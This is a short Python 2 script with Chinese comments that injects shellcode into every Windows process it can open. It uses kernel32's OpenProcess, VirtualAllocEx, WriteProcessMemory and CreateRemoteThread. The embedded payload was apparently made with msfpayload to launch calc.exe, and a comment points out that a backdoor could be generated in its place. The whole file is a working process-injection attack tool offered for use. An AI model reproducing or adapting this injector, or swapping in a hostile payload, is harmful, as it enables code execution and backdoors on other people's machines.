#!python
#-*- coding:utf-8 -*-
#导入sys库以及ctypes库
import sys
from ctypes import *

PAGE_EXECUTE_READWRITE  =  0x00000040
PROCESS_ALL_ACCESS  =  ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM  =  ( 0x1000 | 0x2000 )

kernel32  =  windll.kernel32

# shellcode使用msfpayload生成的，我这里是一个计算器，当然你可以直接生成一个后门程# 序。生成代码：msfpayload  windows/exec  CMD = calc.exe  EXITFUNC=thread  C　
shellcode = ("\xbe\x48\xb2\x58\x19\xda\xd9\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x9b\x83\xe8\xfc\x31\x70\x10\x03\x70\x10\xaa\x47\xe5\xb6\xb2\x4c\x04\x10\x12\x55\x5d\x86\x66\x39\xb5\x0f\x37\x52\xf8\xe0\x22\xd8\x3c\xfa\x4f\xb1\xd3\xe1\x15\x0c\xdb\x4d\xaf\x5a\x72\x06\x30\x0f\x43\xf9\x0e\x77\x54\x40\x7e\xf1\x03\x1d\x71\x40\x12\x30\xe7\x5e\x58\x53\x33\x07\xec\xb3\xeb\x54\xac\x6a\x9f\xdb\xd6\xbd\xfc\x7a\x3e\x19\xfd\x8d\xa4\x71\x0a\x20\xc2\x0a\xf8\x7c\x2a\x73\x10\x5a\x81\xde\x3a\xaf\x72\x06\x9e\x35\x5e\x27\x39\x5d\x9d\x30\x04\xa4\x40\x9f\xfe\xc0\x71\xa9\x34\x2f\xa8\x5f\xea\x67\xba\x71\x2b\x3f\x1c\xfc\x38\xd8\xa1\x16\xfa\x73\x09\xc9\x17\x5a\xaf\xf1\xc3\x5a\x3c\xb3\x9f\x25\x4e\x62\x86\x82\xc8\xf6\x72\xf9\xac\xe5\xad\xdd\x78\x4d\x0a\x64\x06\x96\xec\x39\x1e\x72\xdd\xd7\x18\x4c\xd0\xfc\x54\x20\x72\xb5\xa0\x6d\x96\x29\xd9\xf1\xd8\x81\x2f\x20\xad\x32\x0a\xa3\xf7\x0a\x6b\xc2\x2e\x61\xdb\x0e\xea\x70\x76\x95\x0b\xb3\x53\xbf\x59\x97\x86\x1f\xac\x7d\x30\xcd\xf8\x6a\xd6\x85\x25\x50\x9d\x30\x0f\x80\x42\xa4\xa6\xbd\x3a\xcb\x3d\xf3\x85\x78\xfd\x79\xfe\xdb\x21\x48\xc8\x6c\xff\xd9\x43\x88\xc7\xb3\x48\x11\x5e\x92\x69\xcc\xd9\x7d\x67\x38\x7e\xa6\xe9\x20\x52\xfe\x28\x23\x30\xab\x67\xef\xa7\x88\x91\x0f\xf2\x89\x63\x26\x06\x57\x88\xdb\x3a\x50\xbe\x44\x47\x96\x5e\x61\xc5\xdc\xe7\x29\x5b\x48\xe0\x80\xdd\x74\x83\x65\x71\xcf\x2e\x53\x1e\x77\x1d\x57\x82\xa9\x15\x2e\x59\x20\x3e\xe1\x07\x67\xa3\xc9\xa0\xfb\xd8\x48\x9f\x29\xa2\xc6\x15\x40\x9b\xf4\x2e\x5b\x05\x5e\x2f\x38\xa1\x41\x66\xeb\x10\xaf\x6e\x8f\x1c\x94\xae\xcc\x6b\xa5\xa6\xe0\xbf\xbd\x25\xa3\x1f\x3e\x6c\x8d\xd5\x1e\x53\x31\xec\xb6\xad\xf8\x2d\x6a\x9d\xed\x01\x6b\xc0\x67\xd3\x2d\xad\xc2\x7f\x4e\x10\xc3\x24\xf5\x31\x13\xe1\x5f\x86\xb7\x07\x18\x3a\x8a\x2c\x24\x4b\x8d\xa3\xf4\x01\xc9\x34\xe3\xce\x37\x5e\x57\xf6\x99\x9c\x7b\x88\xb3\x26\xd0\x1d\x35\x2e\xb0\xbd\x37\x33\x6f\xe6\xf3\x15\x05\xde\x37\x56\x43\xdb\xe3\x49\x7d\x26\x19\x24\x22\x16\xfd\xc4\x0b\x55\xf6\x14\x3e\x0a\xc3\x4d\x80\x95\x90\xca\xbf\x74\xfc\xae\xe3\x0b\xa4\x81\x4d\xf0\x48\xba\xfd\xea\x2c\xb7\x86\x68\x0a\x24\x46\x92\x01\x82\x93\x54\x47\x20\x9c\x25\xe1\x63\x24\x51\x3a\xec\x93\xd3\x2b\xd6\x20\x31\xa7\xd6\xf8\x61\xb4\x75\x67\xb1\x8f\x69\xa1\x97\xfc\xbf\xb5\x90\x60\x39\x56\xf6\x37\xa0\x5e\xf1\x3f\x81\xde\xc6\xf6\x3b\x5d\xea\x6a\x49\xef\xe9\xda\xfd\x31\xea\x0a\x80\xf1\x2c\xa8\xdc\x8b\x3c\x12\xbf\x62\xca\x52\x12\x36\xd9\xa4\x52\x19\x42\x61\x4f\x3f\x50\xe6\x28\x37\x3a\xe7\xf0\x5a\xb1\x07\xfc\xeb\x94\x47\x8f\x22\x81\x5b\x64\xcd\xaf\x73\x55\xcf\x27\xaa\x36\x82\xe5\xa1\xa6\x2d\x0d\x9b\x86\x11\xff\x2d\x33\xbe\x9a\x50\x1a\xee\xdf\x5c\x2d\xfe\xe5\xb0\x17\x3e\xaa\x17\x02\xdb\x71\x36\x47\x6c")

code_size = len(shellcode)

for pid in range(1,65535):
    # 获取我们要注入的进程句柄
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid))


    if not h_process:
        print "[*] Couldn't acquire a handle to PID: %s" % pid
        continue


    # 为我们的shellcode申请内存
    arg_address = kernel32.VirtualAllocEx( h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

    # 在内存中写入shellcode
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))

    # 创建远程线程，指定入口为我们的shellcode头部
    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):
        print "[*] Failed to inject shellcode. Exiting."
        continue
    print str(pid) + ":[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value

